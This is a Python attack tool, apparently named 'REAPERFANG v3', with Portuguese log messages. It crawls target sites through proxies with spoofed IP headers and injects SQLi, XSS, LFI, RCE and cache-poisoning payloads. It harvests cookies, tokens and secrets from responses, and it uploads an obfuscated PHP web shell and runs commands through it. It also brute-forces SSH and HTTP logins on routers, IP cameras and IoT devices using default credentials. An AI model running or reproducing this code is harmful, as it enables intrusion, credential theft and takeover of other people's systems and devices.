import os
import sys
import re
import time
import random
import threading
import queue
import socket
import paramiko  
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from requests.exceptions import RequestException


BANNER = r"""
 ███████████ █████ █████     █████    █████ █████                         
░█░░░███░░░█░░███ ░░███    ███░░░███ ░░███ ░░███                          
░   ░███  ░  ░███  ░███ █ ███   ░░███ ░███  ░███ █                        
    ░███     ░███████████░███    ░███ ░███████████                        
    ░███     ░░░░░░░███░█░███    ░███ ░░░░░░░███░█                        
    ░███           ░███░ ░░███   ███        ░███░                         
    █████          █████  ░░░█████░         █████                         
   ░░░░░          ░░░░░     ░░░░░░         ░░░░░                          
                                                                          
                                                                          
                                                                          
 ███████████                                                   ███████████
░░███░░░░░███                                                 ░░███░░░░░░█
 ░███    ░███   ██████   ██████   ████████   ██████  ████████  ░███   █ ░ 
 ░██████████   ███░░███ ░░░░░███ ░░███░░███ ███░░███░░███░░███ ░███████   
 ░███░░░░░███ ░███████   ███████  ░███ ░███░███████  ░███ ░░░  ░███░░░█   
 ░███    ░███ ░███░░░   ███░░███  ░███ ░███░███░░░   ░███      ░███  ░    
 █████   █████░░██████ ░░████████ ░███████ ░░██████  █████     █████      
░░░░░   ░░░░░  ░░░░░░   ░░░░░░░░  ░███░░░   ░░░░░░  ░░░░░     ░░░░░       
                                  ░███                                    
                                  █████                                   
                                 ░░░░░                                    
                                                                          
                                                                          
  ██████   ████████    ███████                                            
 ░░░░░███ ░░███░░███  ███░░███                                            
  ███████  ░███ ░███ ░███ ░███                                            
 ███░░███  ░███ ░███ ░███ ░███                                            
░░████████ ████ █████░░███████                                            
 ░░░░░░░░ ░░░░ ░░░░░  ░░░░░███                                            
                      ███ ░███                                            
                     ░░██████                                             
                      ░░░░░░                                               
               [ REAPERFANG v3 - T404 ]
"""

print(BANNER)


MAX_THREADS = 30
USE_PROXIES = True
PROXIES_FILE = "proxy.txt"  
COMMANDS_FILE = "comandos.txt"  

LOG_DIR = "logs"
if not os.path.exists(LOG_DIR):
    os.mkdir(LOG_DIR)


USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 Chrome/111.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 Version/16.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/90.0.4430.212 Safari/537.36",
]


proxy_queue = queue.Queue()
url_queue = queue.Queue()
visited_urls = set()
shells_control = {}  


def log(msg, filename="reaperfang.log"):
    path = os.path.join(LOG_DIR, filename)
    with open(path, "a", encoding="utf-8") as f:
        f.write(f"{time.ctime()} - {msg}\n")
    print(msg)

def log_vuln(type_vuln, msg):
    filename = f"results_{type_vuln.lower()}.log"
    log(msg, filename=filename)


def load_proxies():
    if not os.path.exists(PROXIES_FILE):
        log(f"[PROXY] Arquivo {PROXIES_FILE} não encontrado, sem proxy.")
        return
    with open(PROXIES_FILE, "r") as f:
        for line in f:
            proxy = line.strip()
            if proxy:
                proxy_queue.put(proxy)
    log(f"[PROXY] {proxy_queue.qsize()} proxies carregados.")

def get_proxy():
    if not USE_PROXIES or proxy_queue.empty():
        return None
    proxy = proxy_queue.get()
    proxy_queue.put(proxy)  
    return {
        "http": f"http://{proxy}",
        "https": f"http://{proxy}",
    }


def random_headers(extra_headers=None):
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
        "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4)),
        "X-Client-IP": ".".join(str(random.randint(1, 255)) for _ in range(4)),
        "X-Remote-IP": ".".join(str(random.randint(1, 255)) for _ in range(4)),
        "X-Remote-Addr": ".".join(str(random.randint(1, 255)) for _ in range(4)),
    }
    if extra_headers:
        headers.update(extra_headers)
    return headers


def get_params(url):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    return params

def add_params(url, new_params):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params.update(new_params)
    query = urlencode(params, doseq=True)
    new_url = urlunparse(parsed._replace(query=query))
    return new_url

def extract_links(base_url, html):
    hrefs = set()
    for match in re.findall(r'href=[\'"]?([^\'" >]+)', html, re.I):
        abs_link = urljoin(base_url, match)
        if urlparse(abs_link).netloc == urlparse(base_url).netloc:
            hrefs.add(abs_link)
    return hrefs


def generate_sqli_payloads():
    return [
        "' OR '1'='1",
        "' OR 1=1 -- ",
        "' OR '1'='1' /*",
        "' OR SLEEP(5) -- ",
        "' UNION SELECT NULL,NULL-- ",
        "' OR BENCHMARK(1000000,MD5(1))-- ",
    ]

def generate_xss_payloads():
    return [
        "<script>alert(1)</script>",
        "\"><svg/onload=alert(1)>",
        "'\"><img src=x onerror=alert(1)>",
        "<body onload=alert(1)>",
        "';alert(document.domain);//",
    ]

def generate_lfi_payloads():
    return [
        "../../../../../../../../etc/passwd",
        "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "../../../../../proc/self/environ",
        "../../../../../../../../var/log/apache2/access.log",
    ]

def generate_rce_payloads():
    base_cmd = "echo LORDX_RCE_TEST"
    return [
        f"<?php system('{base_cmd}'); ?>",
        f"<?php passthru('{base_cmd}'); ?>",
        f"<?php shell_exec('{base_cmd}'); ?>",
        f"<?php exec('{base_cmd}'); ?>",
        f"{{{{ os.system('{base_cmd}') }}}}",  
        f"`{base_cmd}`",  
        f"{{% system('{base_cmd}') %}}",  
    ]

def get_request_session():
    s = requests.Session()
    proxy = get_proxy()
    if proxy:
        s.proxies.update(proxy)
    return s


def extract_sensitive_data(response, url, vuln_type):
    sensitive = {}
    if response.cookies:
        cookies = response.cookies.get_dict()
        if cookies:
            sensitive['cookies'] = cookies
    headers = response.headers
    token_headers = {}
    for h in ['Authorization', 'Set-Cookie', 'X-Auth-Token', 'X-CSRF-Token', 'Cookie']:
        if h in headers:
            token_headers[h] = headers[h]
    if token_headers:
        sensitive['headers'] = token_headers
    secrets = re.findall(r"(api_key|token|secret|password)[\"':=]\s*([a-zA-Z0-9-_]+)", response.text, re.I)
    if secrets:
        sensitive['secrets'] = secrets
    if sensitive:
        log_vuln(vuln_type, f"[DATA EXTRACTION] Dados sensíveis extraídos de {url}: {sensitive}")


def sqli_test(url):
    params = get_params(url)
    if not params:
        log(f"[SQLi] Sem parâmetros GET em {url}")
        return False
    session = get_request_session()
    for param in params:
        for payload in generate_sqli_payloads():
            test_params = params.copy()
            test_params[param] = payload
            parsed = urlparse(url)
            query = urlencode(test_params, doseq=True)
            test_url = urlunparse(parsed._replace(query=query))
            try:
                r = session.get(test_url, headers=random_headers(), timeout=12)
                if re.search(r"sql syntax|mysql_fetch|You have an error|Warning: mysqli", r.text, re.I) or \
                   ("SLEEP" in payload and r.elapsed.total_seconds() > 4):
                    log_vuln("SQLi", f"[SQLi] Vulnerabilidade detectada em {test_url}")
                    extract_sensitive_data(r, test_url, "SQLi")
                    return True
            except RequestException as e:
                log(f"[SQLi] Erro na requisição: {e}")
    return False

def xss_test(url):
    params = get_params(url)
    if not params:
        log(f"[XSS] Sem parâmetros GET em {url}")
        return False
    session = get_request_session()
    for param in params:
        for payload in generate_xss_payloads():
            test_params = params.copy()
            test_params[param] = payload
            parsed = urlparse(url)
            query = urlencode(test_params, doseq=True)
            test_url = urlunparse(parsed._replace(query=query))
            try:
                r = session.get(test_url, headers=random_headers(), timeout=12)
                if payload in r.text:
                    log_vuln("XSS", f"[XSS] Vulnerabilidade detectada em {test_url}")
                    extract_sensitive_data(r, test_url, "XSS")
                    return True
            except RequestException as e:
                log(f"[XSS] Erro na requisição: {e}")
    return False

def cpdos_test(url):
    headers1 = random_headers()
    headers2 = random_headers()
    headers2.update({
        "Host": "evil.com",
        "X-Forwarded-Host": "evil.com",
        "X-Original-URL": "/",
    })
    session = get_request_session()
    try:
        r1 = session.get(url, headers=headers1, timeout=12)
        r2 = session.get(url, headers=headers2, timeout=12)
        if r1.text != r2.text:
            log_vuln("CPDoS", f"[CPDoS] Suspeita de vulnerabilidade em {url} (respostas diferentes)")
            extract_sensitive_data(r2, url, "CPDoS")
            return True
    except RequestException as e:
        log(f"[CPDoS] Erro na requisição: {e}")
    return False

def lfi_test(url):
    params = get_params(url)
    if not params:
        log(f"[LFI] Sem parâmetros GET em {url}")
        return False
    session = get_request_session()
    for param in params:
        for payload in generate_lfi_payloads():
            test_params = params.copy()
            test_params[param] = payload
            parsed = urlparse(url)
            query = urlencode(test_params, doseq=True)
            test_url = urlunparse(parsed._replace(query=query))
            try:
                r = session.get(test_url, headers=random_headers(), timeout=12)
                if "root:x:" in r.text or "[extensions]" in r.text or "env" in r.text:
                    log_vuln("LFI", f"[LFI] Vulnerabilidade detectada em {test_url}")
                    extract_sensitive_data(r, test_url, "LFI")
                    return True
            except RequestException as e:
                log(f"[LFI] Erro na requisição: {e}")
    return False

def rce_test(url):
    params = get_params(url)
    if not params:
        log(f"[RCE] Sem parâmetros GET em {url}")
        return False
    session = get_request_session()
    for param in params:
        for payload in generate_rce_payloads():
            test_params = params.copy()
            test_params[param] = payload
            parsed = urlparse(url)
            query = urlencode(test_params, doseq=True)
            test_url = urlunparse(parsed._replace(query=query))
            try:
                r = session.get(test_url, headers=random_headers(), timeout=12)
                if "LORDX_RCE_TEST" in r.text:
                    log_vuln("RCE", f"[RCE] Vulnerabilidade detectada em {test_url}")
                    extract_sensitive_data(r, test_url, "RCE")
                    upload_webshell(test_url)
                    return True
            except RequestException as e:
                log(f"[RCE] Erro na requisição: {e}")
    return False

def brute_force_basic_auth(url):
    users = ["admin", "root", "user", "test"]
    passwords = ["admin", "123456", "password", "test", "1234"]
    session = get_request_session()
    for user in users:
        for pwd in passwords:
            try:
                r = session.get(url, auth=(user, pwd), headers=random_headers(), timeout=10)
                if r.status_code == 200:
                    log_vuln("BRUTEFORCE", f"[BRUTEFORCE] Login bem sucedido em {url} com {user}:{pwd}")
                    extract_sensitive_data(r, url, "BRUTEFORCE")
                    return True
            except RequestException as e:
                log(f"[BRUTEFORCE] Erro: {e}")
    return False

def upload_webshell(url):
    session = get_request_session()
    obfuscated_shell = (
        "<?php if(isset($_GET['cmd'])){echo '<pre>';"
        "system(base64_decode($_GET['cmd']));echo '</pre>';} ?>"
    )
    possible_paths = ["", "/upload", "/images", "/tmp", "/files", "/uploads"]
    parsed = urlparse(url)
    for path in possible_paths:
        shell_url = f"{parsed.scheme}://{parsed.netloc}{path}/shell.php"
        try:
            files = {'file': ('shell.php', obfuscated_shell, 'application/x-php')}
            r = session.post(shell_url, files=files, headers=random_headers(), timeout=15)
            if r.status_code in [200, 201]:
                log_vuln("WEBSHELL", f"[WEBSHELL] Upload possível em {shell_url}")
                shells_control[shell_url] = ""  
                return True
        except RequestException as e:
            log(f"[WEBSHELL] Upload falhou em {shell_url}: {e}")
    return False

def execute_shell_command(shell_url, command):
    session = get_request_session()
    try:
        
        import base64
        cmd_b64 = base64.b64encode(command.encode()).decode()
        r = session.get(shell_url, params={'cmd': cmd_b64}, headers=random_headers(), timeout=10)
        if r.status_code == 200:
            log(f"[SHELL CMD] Comando '{command}' executado em {shell_url}")
            shells_control[shell_url] = command
            return r.text
        else:
            log(f"[SHELL CMD] Falha status {r.status_code} em {shell_url}")
            return None
    except RequestException as e:
        log(f"[SHELL CMD] Erro na execução em {shell_url}: {e}")
        return None


def satellite_attack(ip):
    log(f"[SATELLITE ATTACK] Iniciando ataque no IP {ip}...")
    critical_ports = [22, 23, 21, 161, 80, 443]  
    open_ports = scan_ports(ip, critical_ports)
    if not open_ports:
        log("[SATELLITE ATTACK] Nenhuma porta crítica aberta encontrada.")
        return False
    log(f"[SATELLITE ATTACK] Portas abertas: {open_ports}")
    usernames = ["admin", "root", "satellite", "user"]
    passwords = ["admin", "1234", "password", "satellite", "123456"]

    for port in open_ports:
        if port == 22:
            brute_force_ssh(ip, port, usernames, passwords)
        elif port in [80, 443]:
            brute_force_http_basic(ip, port, usernames, passwords)
        else:
            log(f"[SATELLITE ATTACK] Porta {port} aberta mas brute force não implementado.")
    return True

def brute_force_http_basic(ip, port, usernames, passwords):
    valid_creds = []
    url = f"http://{ip}:{port}/"
    session = get_request_session()
    for user in usernames:
        for pwd in passwords:
            try:
                r = session.get(url, auth=(user, pwd), timeout=5)
                if r.status_code == 200:
                    valid_creds.append((user, pwd))
                    log(f"[HTTP BASIC] Credencial válida: {ip}:{port} {user}:{pwd}")
            except:
                pass
    return valid_creds

def attack_ip_cameras(ip):
    log(f"[IP CAMERAS] Atacando câmera IP no IP {ip}...")

    open_ports = scan_ports(ip, [80, 554])
    if not open_ports:
        log("[IP CAMERAS] Nenhuma porta padrão de câmera aberta.")
        return False
    for port in open_ports:
        if port == 80:
            brute_force_http_basic(ip, port, ["admin", "root", "guest"], ["admin", "1234", "password"])
        elif port == 554:
            
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((ip, 554))
                s.send(b"OPTIONS rtsp://"+ip.encode()+b" RTSP/1.0\r\nCSeq: 1\r\n\r\n")
                resp = s.recv(1024)
                if b"RTSP" in resp:
                    log(f"[IP CAMERAS] RTSP serviço ativo em {ip}:554")
                s.close()
            except Exception as e:
                log(f"[IP CAMERAS] Erro RTSP: {e}")
    return True

def attack_routers(ip):
    log(f"[ROUTERS] Atacando roteador no IP {ip}...")
    
    open_ports = scan_ports(ip, [22, 23, 80, 443])
    if not open_ports:
        log("[ROUTERS] Nenhuma porta padrão encontrada.")
        return False
    usernames = ["admin", "root", "user", "guest"]
    passwords = ["admin", "123456", "password", "1234"]
    for port in open_ports:
        if port == 22:
            brute_force_ssh(ip, port, usernames, passwords)
        elif port == 23:
            
            log(f"[ROUTERS] Porta Telnet 23 aberta em {ip}.")
        elif port in [80, 443]:
            brute_force_http_basic(ip, port, usernames, passwords)
    return True

def attack_iot_devices(ip):
    log(f"[IOT DEVICES] Iniciando ataque no IP {ip}...")
    
    open_ports = scan_ports(ip, [80, 443, 8080, 8443, 554, 8888])
    if not open_ports:
        log("[IOT DEVICES] Nenhuma porta IoT padrão aberta.")
        return False
    usernames = ["admin", "root", "user", "guest"]
    passwords = ["admin", "1234", "password", "123456"]
    for port in open_ports:
        brute_force_http_basic(ip, port, usernames, passwords)
    return True



def scan_ports(ip, ports, timeout=1):
    open_ports = []
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        try:
            if sock.connect_ex((ip, port)) == 0:
                open_ports.append(port)
        except Exception:
            pass
        finally:
            sock.close()
    return open_ports

def brute_force_ssh(ip, port, usernames, passwords):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    valid_creds = []
    for user in usernames:
        for pwd in passwords:
            try:
                ssh.connect(ip, port=port, username=user, password=pwd, timeout=5)
                valid_creds.append((user, pwd))
                log(f"[SSH] Credencial válida encontrada: {ip}:{port} {user}:{pwd}")
                ssh.close()
                return True
            except:
                continue
    return False


def worker():
    while True:
        try:
            url = url_queue.get(timeout=60)
        except queue.Empty:
            break

        if url in visited_urls:
            url_queue.task_done()
            continue

        visited_urls.add(url)
        log(f"[WORKER] Testando URL: {url}")

        
        sqli_test(url)
        xss_test(url)
        cpdos_test(url)
        lfi_test(url)
        rce_test(url)
        brute_force_basic_auth(url)

        
        parsed = urlparse(url)
        ip = None
        try:
            ip = socket.gethostbyname(parsed.netloc)
        except:
            pass

        if ip:
            
            satellite_attack(ip)
            attack_ip_cameras(ip)
            attack_routers(ip)
            attack_iot_devices(ip)

        
        try:
            session = get_request_session()
            r = session.get(url, headers=random_headers(), timeout=15)
            links = extract_links(url, r.text)
            for link in links:
                if link not in visited_urls:
                    url_queue.put(link)
        except Exception as e:
            log(f"[CRAWL] Erro ao buscar links: {e}")

        url_queue.task_done()



def main():
    load_proxies()
    print("[MAIN] Insira as URLs/alvos (uma por linha). Use 'sair' para começar os testes.")
    while True:
        line = input("> ").strip()
        if line.lower() == "sair":
            break
        if not line.startswith("http"):
            line = "http://" + line
        url_queue.put(line)
    print("[MAIN] Iniciando threads...")
    threads = []
    for _ in range(MAX_THREADS):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    print("[MAIN] Todos os testes concluídos.")

if __name__ == "__main__":
    main()
